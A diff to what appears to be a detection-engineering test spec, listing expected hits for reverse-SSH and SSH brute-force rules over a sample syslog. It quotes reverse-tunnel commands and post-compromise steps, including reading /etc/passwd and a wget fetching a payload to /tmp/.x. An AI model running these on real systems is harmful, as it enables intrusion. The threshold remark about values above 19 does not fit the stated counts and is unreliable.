@@ -86,9 +86,37 @@ Fires on every line where the MAC prefix is in the F5 OUI list. Re-check with `g
 
 ## `syslog.txt`
 
+103 lines total. Mix of `bash: user X ran command: Y` entries and sshd auth events.
+
 ### `reverse_ssh.py`
 
-Fires on lines matching both `\bssh\b` or `\bautossh\b` AND `\s-R\s`. Exact count: re-derive from current log.
+Fires on lines matching both `\bssh\b` or `\bautossh\b` AND `\s-R\s`. Expected hits:
+- `Oct 26 13:44:55` daniel &mdash; `ssh -R 2222:localhost:22 tunnelhost.example.com`
+- `Oct 26 14:25:08` priya &mdash; `autossh -M 0 -f -N -R 2222:localhost:22 tunnelhost.example.com`
+- `Oct 27 18:24:48` fatima &mdash; `ssh -R 8080:localhost:8080 jumphost.example.com`
+
+Total: 3 hits.
+
+### SSH brute force (detection in progress, `Detections/Draft/`)
+
+Rule shape: count `Failed password` events per source IP, alert when count exceeds a threshold. Surface whether any later `Accepted` event from the same IP indicates a successful compromise.
+
+#### True positives (detection should fire)
+
+- `198.51.100.42` &mdash; 19 failed attempts at `Oct 27 09:33:48` to `09:34:44` across root, admin, oracle, postgres, ubuntu, ec2-user, centos, debian, pi, git, jenkins, hadoop, elasticsearch, ansible, deploy, backup, test, user. **Followed by Accepted for daniel at 09:34:47**, then `id`, `uname -a`, `cat /etc/passwd`, and `wget http://203.0.113.99/x -O /tmp/.x` from the daniel account &mdash; the post-exploitation activity confirms compromise. High-severity alert.
+- `203.0.113.77` &mdash; 8 failed attempts at `Oct 27 14:11:25` to `14:11:46` across root, admin, oracle, ubuntu, test, git, user. No subsequent Accepted from this IP. Medium-severity alert.
+
+#### Below-threshold noise (detection should NOT fire if threshold is sensibly set)
+
+- `10.20.4.69` maya at 08:46:33 &mdash; 1 failed, then immediately Accepted. Mistyped password, legitimate.
+- `10.20.4.74` jake at 10:51:09 &mdash; 1 failed, then immediately Accepted. Legitimate.
+- `10.20.4.55` alex at 16:02:55 &mdash; 1 failed, then immediately Accepted. Legitimate.
+
+Threshold guidance: any value between 3 and 8 catches both attacks and excludes the legitimate-typo cases. Above 19 misses the second attacker.
+
+#### Stretch goal
+
+Surface the **success-after-failure** correlation as a higher-severity alert: any IP with > N failed events followed by an Accepted event in the same window. The 198.51.100.42 case qualifies; 203.0.113.77 does not.
 
 ---
 
